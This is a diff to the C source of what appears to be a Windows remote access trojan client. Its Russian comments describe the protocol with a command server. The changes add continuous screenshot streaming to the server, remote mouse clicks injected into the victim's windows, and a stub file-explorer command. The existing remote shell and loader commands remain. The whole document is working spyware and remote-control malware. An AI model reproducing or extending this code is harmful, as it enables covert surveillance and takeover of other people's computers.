@@ -3,6 +3,7 @@
 #include "ntdll.h"
 #include "iphlpapi.h"
 #include "stdio.h"
+#include "parson.h"
 
 #pragma comment(lib, "iphlpapi")
 #pragma comment(lib, "ws2_32")
@@ -12,7 +13,7 @@
 #define min(a,b) (((a) < (b)) ? (a) : (b))
 #endif
 
-#define ADDRSERVER "127.000.000.001"
+#define ADDRSERVER "127.0.0.1"
 
 SOCKET Socket;
 
@@ -23,8 +24,24 @@ SOCKET Socket;
 #define CMD_SCREEN		0x4
 #define CMD_LOADER		0x5
 #define CMD_SHELL		0x6
+#define CMD_EXPLOR		0x7
 
-void SaveBitmap(char* szFilename, HBITMAP hBitmap);
+#define DO_GETCURPATH	0x0
+#define DO_SETCURPATH   0x1
+#define DO_DOWLDFILE	0x2
+#define DO_UPLDFILE		0x3
+#define DO_REMFILE		0x4
+#define DO_EXEC			0x5
+
+#define DO_CHANDGE_WH	0x1
+#define DO_RUNTHREAD	0x2
+#define DO_LCLICK       0x3
+#define DO_DCLICK       0x4
+#define DO_RCLICK       0x5
+
+int ServerW, ServerH;
+
+//void SaveBitmap(char* szFilename, HBITMAP hBitmap);
 
 int x1, y1, x2, y2, w, h;
 
@@ -42,11 +59,23 @@ typedef struct DLE
 
 typedef struct BIGSCREEN
 {
+	int DO;
 	int w;
 	int h;
+	int RealW;
+	int RealH;
+	int ClickX;
+	int ClickY;
 	DWORD ZipSize;
 	DWORD Size;
 } BIGSCREEN;
+
+typedef struct EXPLRR
+{
+	DWORD IND;
+	DWORD DO;
+	DWORD SIZEofJSON;
+} EXPLRR;
 
 typedef struct CMDiDATA
 {
@@ -169,43 +198,50 @@ BYTE *Compress(BYTE *uncompBuffer, \
 
 DWORD WINAPI GETSCREEN(LPVOID param)
 {
-	HDC hScreen = GetDC(NULL);
-	HDC hDC = CreateCompatibleDC(hScreen);
-	BYTE* buff;
-	HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, 683, 384);
-	SelectObject(hDC, hBitmap);
-	SetStretchBltMode(hDC, HALFTONE);
-	StretchBlt(hDC, 0, 0, 683, 384, hScreen, 0, 0, w, h, SRCCOPY);
-	SelectObject(hDC, hBitmap);
-	BITMAPINFO bmi = { sizeof(BITMAPINFOHEADER), 683, 384, 1, 32, BI_RGB, 0, 0, 0, 0, 0 };
-	GetDIBits(hDC, hBitmap, 0, 384, NULL, &bmi, DIB_RGB_COLORS);
-	DWORD buffsize;
-	buffsize = bmi.bmiHeader.biSizeImage;
-	buff = (BYTE*)malloc(buffsize);
-	GetDIBits(hDC, hBitmap, 0, 384, buff, &bmi, DIB_RGB_COLORS);
-	DWORD realCompSize;
-	BYTE *compressed_buffer = Compress(buff, buffsize, buffsize + 512, &realCompSize);
-	CMDiDATA indata;
-	memset(&indata, 0, sizeof(CMDiDATA));
-	
-	indata.CMD = CMD_SCREEN;
-	BIGSCREEN screenshot;
-	screenshot.w = 683;
-	screenshot.h = 384;
-	screenshot.ZipSize = realCompSize;
-	screenshot.Size = buffsize;
-	memcpy(&indata.DATA, &screenshot, sizeof(BIGSCREEN));
-	send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
-	send(Socket, (char *)compressed_buffer, screenshot.ZipSize, 0);
-	
-	free(buff);
-	DeleteDC(hDC);
-	DeleteDC(hScreen);
-	DeleteObject(hBitmap);
-	free(compressed_buffer);
-	memset(&bmi, 0, sizeof(BITMAPINFO));
-	memset(&indata, 0, sizeof(CMDiDATA));
-	memset(&screenshot, 0, sizeof(BIGSCREEN));
+	while (TRUE) {
+		HDC hScreen = GetDC(NULL);
+		HDC hDC = CreateCompatibleDC(hScreen);
+		BYTE* buff;
+		HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, ServerW, ServerH);
+		SelectObject(hDC, hBitmap);
+		SetStretchBltMode(hDC, HALFTONE);
+		StretchBlt(hDC, 0, 0, ServerW, ServerH, hScreen, 0, 0, w, h, SRCCOPY);
+		SelectObject(hDC, hBitmap);
+		BITMAPINFO bmi = { sizeof(BITMAPINFOHEADER), ServerW, ServerH, 1, 32, BI_RGB, 0, 0, 0, 0, 0 };
+		GetDIBits(hDC, hBitmap, 0, ServerH, NULL, &bmi, DIB_RGB_COLORS);
+		DWORD buffsize;
+		buffsize = bmi.bmiHeader.biSizeImage;
+		buff = (BYTE*)malloc(buffsize);
+		GetDIBits(hDC, hBitmap, 0, ServerH, buff, &bmi, DIB_RGB_COLORS);
+		DWORD realCompSize;
+		BYTE *compressed_buffer = Compress(buff, buffsize, buffsize + 512, &realCompSize);
+		CMDiDATA indata;
+		memset(&indata, 0, sizeof(CMDiDATA));
+
+		indata.CMD = CMD_SCREEN;
+		BIGSCREEN screenshot;
+		screenshot.w = ServerW;
+		screenshot.h = ServerH;
+		screenshot.ZipSize = realCompSize;
+		screenshot.Size = buffsize;
+		screenshot.RealW = w;
+		screenshot.RealH = h;
+		memcpy(&indata.DATA, &screenshot, sizeof(BIGSCREEN));
+		send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
+		send(Socket, (char *)compressed_buffer, screenshot.ZipSize, 0);
+
+		free(buff);
+		DeleteDC(hDC);
+		DeleteDC(hScreen);
+		DeleteObject(hBitmap);
+		free(compressed_buffer);
+		memset(&bmi, 0, sizeof(BITMAPINFO));
+		memset(&indata, 0, sizeof(CMDiDATA));
+		memset(&screenshot, 0, sizeof(BIGSCREEN));
+
+		Sleep(500);
+	}
+
 	return 0;
 }
 
@@ -272,30 +308,25 @@ DWORD WINAPI RUNSHELL(LPVOID port)
 					}
 					PeekNamedPipe(hPipeRead1, NULL, NULL, NULL, &lpNumberOfBytesRead, NULL);
 				}
-				
 				Sleep(200);
-
 				i = recv(shellsock, szBuffer, sizeof(szBuffer), 0);
-
 				if (shellsock == 0)
 				{
 					count++;
 					if (count > 1) break;
 				}
-
 				if (!strstr(szBuffer, "exit") == 0)
 				{
 					closesocket(shellsock);
 					goto exit;
 				}
-
 				else 
 					WriteFile(hPipeWrite2, szBuffer, i, &lpNumberOfBytesRead, 0);
 			}
 		}
 		else
 		{
-			Sleep(100);
+			Sleep(1000);
 		}
 	}
 exit:
@@ -303,12 +334,39 @@ exit:
 	return 0;
 }
 
+void GetCurPath()
+{	
+	//WIN32_FIND_DATAA ffd;
+	//CHAR szDir[3000 * sizeof(CHAR)];
+	//GetCurrentDirectoryA(
+	//	3000,
+	//	szDir
+	//);
+	//lstrcatA(szDir, "\\*");
+	//HANDLE hFind = INVALID_HANDLE_VALUE;
+	//hFind = FindFirstFileA(szDir, &ffd);
+	//do
+	//{
+	//	if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+	//	{
+	//		printf("dir:%s\n", ffd.cFileName);
+	//	}
+	//	else
+	//	{
+	//		printf("fil:%s\n", ffd.cFileName);
+	//	}
+	//} while (FindNextFileA(hFind, &ffd) != 0);
+	//FindClose(hFind);
+	//serialized_string = json_serialize_to_string_pretty(root_value);
+	//puts(serialized_string);
+}
+
 DWORD WINAPI RecvThread(LPVOID param)
 {
 	while (TRUE)
 	{
 		CMDiDATA indata; //создаем структуру отвечающую за протокол
-		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 							  //recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0); //прием сообщения от cервера
+		memset(&indata, 0, sizeof(CMDiDATA)); //почистим
 		if (sizeof(CMDiDATA) == recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0)) //прием сообщения от cервера
 		{
 			switch (indata.CMD)
@@ -318,16 +376,207 @@ DWORD WINAPI RecvThread(LPVOID param)
 					CreateThread(NULL, 0, DLEFUNC, NULL, 0, 0);
 					break;
 				}
-
 				case CMD_SHELL:
 				{
 					CreateThread(NULL, 0, RUNSHELL, NULL, 0, 0);
 					break;
 				}
-
 				case CMD_SCREEN:
 				{
-					CreateThread(NULL, 0, GETSCREEN, NULL, 0, 0);
+					BIGSCREEN inBIGSCREEN;
+					memset(&inBIGSCREEN, 0, sizeof(BIGSCREEN));
+					memcpy(&inBIGSCREEN, indata.DATA, sizeof(indata.DATA));
+					switch (inBIGSCREEN.DO)
+					{
+						case DO_RUNTHREAD: {
+							printf("do_runthread\n");
+							CreateThread(NULL, 0, GETSCREEN, NULL, 0, 0);
+							break;
+						}
+
+						case DO_CHANDGE_WH: {
+							printf("do_change_wh\n");
+							ServerW = inBIGSCREEN.w;
+							ServerH = inBIGSCREEN.h;
+							break;
+						}
+
+						case DO_LCLICK: {
+							printf("do_click\n");
+							POINT pointOnScreen;					
+							pointOnScreen.x = inBIGSCREEN.ClickX;
+							pointOnScreen.y = inBIGSCREEN.ClickY;
+							HWND MainWindow = WindowFromPoint(pointOnScreen);
+							
+							LPARAM lParam = MAKELPARAM(pointOnScreen.x, pointOnScreen.y);
+							LRESULT lResult = SendMessageW(MainWindow, WM_NCHITTEST, NULL, lParam);
+							
+							switch (lResult)
+							{
+								case HTTRANSPARENT:
+								{
+									if (NULL != SetWindowLongW(MainWindow, GWL_STYLE, GetWindowLongW(MainWindow, GWL_STYLE) | WS_DISABLED))
+									{
+										if (PostMessageW(MainWindow, WM_NCHITTEST, 0, lParam)) {
+											printf("HTTRANSPARENT\n");
+										}
+									}
+									continue;
+								}
+								case HTCLOSE:
+								{
+									if (PostMessageW(MainWindow, WM_CLOSE, 0, 0)) {
+										printf("HTCLOSE\n");
+									}
+									continue;
+								}
+								case HTMINBUTTON:
+								{
+									if (PostMessageW(MainWindow, WM_SYSCOMMAND, SC_MINIMIZE, 0)) {
+										printf("WM_SYSCOMMAND\n");
+									}
+									continue;
+								}
+								case HTMAXBUTTON:
+								{
+									WINDOWPLACEMENT windowPlacement;
+									windowPlacement.length = sizeof(windowPlacement);
+									if (GetWindowPlacement(MainWindow, &windowPlacement))
+									{
+										if (windowPlacement.flags & SW_SHOWMAXIMIZED) {
+											if (PostMessageW(MainWindow, WM_SYSCOMMAND, SC_RESTORE, 0)) {
+												printf("HTMAXBUTTON :: WM_SYSCOMMAND :: SW_SHOWMAXIMIZED\n");
+											}
+										}
+										else {
+											if (PostMessageW(MainWindow, WM_SYSCOMMAND, SC_MAXIMIZE, 0)) {
+												printf("HTMAXBUTTON :: WM_SYSCOMMAND :: !SW_SHOWMAXIMIZED\n");
+											}
+										}
+									}
+									continue;
+								}
+								default: {
+									RECT startButtonRect;
+									HWND hStartButton = FindWindowW(L"Button", NULL);
+									if (GetWindowRect(hStartButton, &startButtonRect))
+									{
+										if (PtInRect(&startButtonRect, pointOnScreen))
+										{
+											PostMessageW(hStartButton, BM_CLICK, 0, 0);
+											continue;
+										}
+										else
+										{
+											char windowClass[MAX_PATH] = { 0 };
+											RealGetWindowClassW(MainWindow, windowClass, MAX_PATH);
+											if (!lstrcmpW(windowClass, L"#32768"))
+											{
+												HMENU hMenu = (HMENU)SendMessageW(MainWindow, MN_GETHMENU, 0, 0);
+												int itemPos = MenuItemFromPoint(NULL, hMenu, pointOnScreen);
+												int itemId = GetMenuItemID(hMenu, itemPos);
+												PostMessageW(MainWindow, 0x1e5, itemPos, 0);
+												PostMessageW(MainWindow, WM_KEYDOWN, VK_RETURN, 0);
+												LPARAM lParam2 = MAKELPARAM(pointOnScreen.x, pointOnScreen.y);
+												if (PostMessageW(MainWindow, WM_MOUSEMOVE, 0, lParam2))
+													if (PostMessageW(MainWindow, WM_LBUTTONDOWN, MK_LBUTTON, lParam2))
+														if (PostMessageW(MainWindow, WM_LBUTTONUP, MK_LBUTTON, lParam2))
+															printf("menu item click!\n");
+												continue;
+											}
+										}
+
+										for (HWND currHwnd = MainWindow;;)
+										{
+											printf("DO_LCLICK :: currhwnd\n");
+											MainWindow = currHwnd;
+											ScreenToClient(currHwnd, &pointOnScreen);
+											currHwnd = ChildWindowFromPoint(currHwnd, pointOnScreen);
+											if (!currHwnd || currHwnd == MainWindow)
+												break;
+										}
+
+										LPARAM lParam2 = MAKELPARAM(pointOnScreen.x, pointOnScreen.y);
+										if (PostMessageW(MainWindow, WM_MOUSEMOVE, 0, lParam2))
+											if (PostMessageW(MainWindow, WM_LBUTTONDOWN, MK_LBUTTON, lParam2))
+												if (PostMessageW(MainWindow, WM_LBUTTONUP, MK_LBUTTON, lParam2))
+													printf("LClick ok!\n");
+									}
+									continue;
+								}
+							}
+						}
+
+						case DO_RCLICK: {
+							printf("do_click\n");
+							POINT pointOnScreen;
+							pointOnScreen.x = inBIGSCREEN.ClickX;
+							pointOnScreen.y = inBIGSCREEN.ClickY;
+
+							HWND MainWindow = WindowFromPoint(pointOnScreen);
+							if (MainWindow != NULL)
+							{
+								for (HWND currHwnd = MainWindow;;)
+								{
+									printf("DO_RCLICK :: currhwnd\n");
+									MainWindow = currHwnd;
+									ScreenToClient(currHwnd, &pointOnScreen);
+									currHwnd = ChildWindowFromPoint(currHwnd, pointOnScreen);
+									if (!currHwnd || currHwnd == MainWindow)
+										break;
+								}
+
+								LPARAM lParam2 = MAKELPARAM(pointOnScreen.x, pointOnScreen.y);
+								if (PostMessageW(MainWindow, WM_MOUSEMOVE, 0, lParam2))
+									if (PostMessageW(MainWindow, WM_RBUTTONDOWN, MK_RBUTTON, lParam2))
+										if (PostMessageW(MainWindow, WM_RBUTTONUP, MK_RBUTTON, lParam2))
+											printf("RClick ok!\n");
+							}
+							continue;
+						}
+
+						case DO_DCLICK: {
+							printf("do_dclick\n");
+							POINT pointOnScreen;
+							pointOnScreen.x = inBIGSCREEN.ClickX;
+							pointOnScreen.y = inBIGSCREEN.ClickY;
+
+							HWND MainWindow = WindowFromPoint(pointOnScreen);
+							if (MainWindow != NULL)
+							{
+								for (HWND currHwnd = MainWindow;;)
+								{
+									printf("do2click :: currhwnd\n");
+									MainWindow = currHwnd;
+									ScreenToClient(currHwnd, &pointOnScreen);
+									currHwnd = ChildWindowFromPoint(currHwnd, pointOnScreen);
+									if (!currHwnd || currHwnd == MainWindow)
+										break;
+								}
+								LPARAM lParam2 = MAKELPARAM(pointOnScreen.x, pointOnScreen.y);
+								if (PostMessageW(MainWindow, WM_MOUSEMOVE, 0, lParam2))
+									if (PostMessageW(MainWindow, WM_LBUTTONDBLCLK, MK_LBUTTON, lParam2))
+										printf("2LClick ok!\n");
+							}
+							continue;
+						}
+					}
+					break;
+				}
+
+				case CMD_EXPLOR:
+				{
+					EXPLRR explr;
+					memset(&explr, 0, sizeof(EXPLRR));
+					memcpy(&explr, indata.DATA, sizeof(EXPLRR));
+					switch (explr.DO)
+					{
+						case DO_GETCURPATH: 
+						{
+							GetCurPath();
+							break;
+						}
+					}
 					break;
 				}
 				default:
@@ -342,20 +591,24 @@ DWORD WINAPI RecvThread(LPVOID param)
 			}
 			Sleep(1000);
 		}
+		memset(&indata, 0, sizeof(CMDiDATA));
 	}
 	return 0;
 }
 
-int WINAPI WinMain(
-	HINSTANCE hInstance,
-	HINSTANCE hPrevInstance,
-	LPSTR     lpCmdLine,
-	int       nShowCmd
-)
+//int WINAPI WinMain(
+//	HINSTANCE hInstance,
+//	HINSTANCE hPrevInstance,
+//	LPSTR     lpCmdLine,
+//	int       nShowCmd
+//)
+int main()
 {
-	//hIn = GetStdHandle(STD_INPUT_HANDLE);
-	//hOut = GetStdHandle(STD_OUTPUT_HANDLE);
+	//683, 384
+	ServerW = 683;
+	ServerH = 384;
 
+	//client w and h
 	x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
 	y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
 	x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
